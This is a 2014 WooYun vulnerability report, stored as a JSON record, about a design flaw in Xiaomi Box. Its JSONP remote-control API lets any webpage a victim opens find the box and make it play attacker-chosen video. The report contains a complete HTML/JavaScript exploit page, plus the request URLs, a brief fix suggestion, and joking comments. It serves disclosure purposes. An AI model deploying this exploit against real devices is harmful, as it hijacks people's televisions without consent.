{"id": 4339, "wybug_id": "wooyun-2014-050904", "wybug_title": "控制用户小米盒子播放内容(让你不知不觉中播放av)", "wybug_corp": "小米科技", "wybug_author": "marvin", "wybug_date": "2014-02-14 10:21", "wybug_open_date": "2014-05-12 10:22", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["终端机安全", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-24：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-12：\t细节向公众公开  简要描述： 小米盒子设计缺陷，导致可被攻击控制 详细说明：  小米盒子可使用http方式进行远程遥控，接口设计缺陷导致可轻易被攻击。比如给朋友发个网址，如果他用家里任意电脑或手机啥的打开了，可让他家电视上自动开始播放毛片，神不知鬼不觉。   漏洞证明：  利用步骤，以播放视频为例：1、通过http://pds.duokanbox.com/peer/fetchbyipopen/?mac_address=1&callback=wooyun 接口可获得当前用户的小米盒子列表，和http远程控制ip及端口2、访问http://ip:port/request?action=isAlive&callback=wooyun 获取盒子状态3、访问http://ip:port/video/action=play&clientname=PC&url=视频地址&name=test&callback=wooyun，提交播放请求同时可发现http://ip:port/controller 接口也可访问，能更多控制。演示：http://yekai.me/mitv/。\n<!doctype html><html><head>\t<meta charset=\"utf-8\">\t<title>你有小米盒子么？</title></head><body>\t<p id=\"tips\" style=\"display:none\">友情提示：播放过程中请不要刷新该页面，会有bug导致电视可能坏掉！</p>\t<ul id=\"playing\">\t</ul>\t<script type=\"text/javascript\">\t(function(){\t\tvar testVideo = 'http://pl.youku.com/playlist/m3u8?ts=1392311744&keyframe=0&vid=XNjYxNjI1ODQ4&type=hd2';\t\tvar randomStr = function(length){\t\t\tvar ret = [];\t\t\tlength = length || 10;\t\t\twhile(length--){\t\t\t\tret.push(String.fromCharCode(97 + Math.floor(Math.random()*25)));\t\t\t}\t\t\treturn ret.join('');\t\t};\t\tvar jsonp = function(url, cb){\t\t\tvar s = document.createElement('script');\t\t\tif(url.search('%cb%') !== -1 && cb){\t\t\t\tvar fcName = randomStr();\t\t\t\twindow[fcName] = cb;\t\t\t\turl = url.replace('%cb%', fcName);\t\t\t}\t\t\ts.src = url;\t\t\tdocument.head.appendChild(s);\t\t};\t\tvar $playlist = document.getElementById('playing'),\t\t\ttips = false;\t\tvar playingTmpl = function(data){\t\t\tif(!tips){\t\t\t\tdocument.getElementById('tips').style.display = 'block';\t\t\t\ttips = true;\t\t\t}\t\t\tvar html = '<li>' + data.devicename + ' : <button data-tv=\"' + data.ip + '\">stop</button></li>';\t\t\t$playlist.innerHTML += html;\t\t};\t\t\t\tvar MI = {\t\t\tgetTvs : function(cb){\t\t\t\tjsonp('http://pds.duokanbox.com/peer/fetchbyipopen/?mac_address=1&callback=%cb%', function(data){\t\t\t\t\tif(data && data.status === 0){\t\t\t\t\t\tcb && cb(data.data);\t\t\t\t\t}\t\t\t\t});\t\t\t},\t\t\tisActive : function(tv, cb){\t\t\t\tjsonp('http://' + tv + '/request?action=isAlive&callback=%cb%', function(data){\t\t\t\t\tif(data && data.status === 0){\t\t\t\t\t\tcb && cb(data.data);\t\t\t\t\t}\t\t\t\t});\t\t\t},\t\t\tplay : function(tv, video, name, cb){\t\t\t\t\t\t\tjsonp('http://' + tv + '/video/action=play&clientname=PC&url=' + encodeURIComponent(video) + '&name=' + encodeURIComponent(name) + '&callback=%cb%', \t\t\t\t\tfunction(data){\t\t\t\t\t\tcb && cb(!data.status);\t\t\t\t});\t\t\t\t\t\t\t},\t\t\tstop : function(tv, cb){\t\t\t\tjsonp('http://' + tv + '/controller?action=keyEvent&keyCode=back&callback=%cb%', function(data){\t\t\t\t\t\tcb && cb(!data.status);\t\t\t\t});\t\t\t\t\t\t\t}\t\t};\t\tMI.getTvs(function(tvs){\t\t\ttvs.forEach(function(tv){\t\t\t\tMI.isActive(tv, function(tvData){\t\t\t\t\tif(tvData){\t\t\t\t\t\tMI.play(tvData.ip, testVideo, '随便一个名字', function(success){\t\t\t\t\t\t\tsuccess && playingTmpl(tvData);\t\t\t\t\t\t});\t\t\t\t\t}\t\t\t\t});\t\t\t});\t\t});\t\tdocument.addEventListener('click', function(e){\t\t\tvar target = e.target;\t\t\tif(target.tagName.toLowerCase() === 'button'){\t\t\t\tvar tv = target.dataset.tv;\t\t\t\tMI.stop(tv, function(status){\t\t\t\t\tif(status){\t\t\t\t\t\ttarget.parentNode.parentNode.removeChild(target.parentNode);\t\t\t\t\t}\t\t\t\t});\t\t\t}\t\t});\t})();\t</script></body></html>\n   修复方案：  不使用jsonp可跨站获取数据接口可避免部分问题   版权声明：转载请注明来源 marvin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-05-12 10:22 厂商回复：  漏洞Rank：20  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-14 10:38 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 11:11 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  让你不知不觉中播放avi     \n     2014-02-14 11:13 |    \t\t计算姬 \t\t\t( 普通白帽子  |\t\t\t        Rank:398 漏洞数:90        | 看我看我看我啊)\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 11:14 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 11:37 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  DLNA？..    \n     2014-02-14 12:06 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  真的吗？？？？？    \n     2014-02-14 12:26 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  让你不知不觉中播放avi     \n     2014-02-14 13:22 |    \t\tJeremy \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:11        | )\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 13:43 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  让你不知不觉中播放avi     \n     2014-02-14 13:54 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 14:14 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  airplay?    \n     2014-02-14 14:14 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  像天猫魔盒 一个网段里面就可以控制，也不用授权啊    \n     2014-02-14 14:45 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  好神奇……    \n     2014-02-14 16:04 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 16:47 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 17:22 |    \t\tgm100861 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | http://www.gm100861.com/)\t\t \n  让你不知不觉中播放avi     \n     2014-02-14 17:34 |    \t\t小杨 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 。)\t\t \n  专业插楼30年    \n     2014-02-14 17:40 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这就是黑哥微博中说的那个么？    \n     2014-02-14 17:42 |    \t\tSaknc \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 小菜B一个)\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 17:58 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  让你不知不觉中播放avi     \n     2014-02-14 19:24 |    \t\t魂淡、 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 么么哒)\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 21:17 |    \t\tRichard \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        )\t\t \n  让你不知不觉中播放avi    \n     2014-02-14 21:19 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  让你不知不觉中播放avi    \n     2014-02-18 00:57 |    \t\twinT \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 关注信息安全)\t\t \n  让你不知不觉中播放avi     \n     2014-02-18 20:03 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  让你不知不觉中播放avi     \n     2014-02-18 22:33 |    \t\t天际 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 我只是在打酱油)\t\t \n  求让我不知不觉中播放avi    \n     2014-02-20 02:08 |    \t\tCJ也疯狂 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 专业源于专注！踏踏实实走好每一步)\t\t \n  呼呼~    \n     2014-02-24 23:44 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  是AV 不是AVI 貌似这个可被敌对势力应用    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}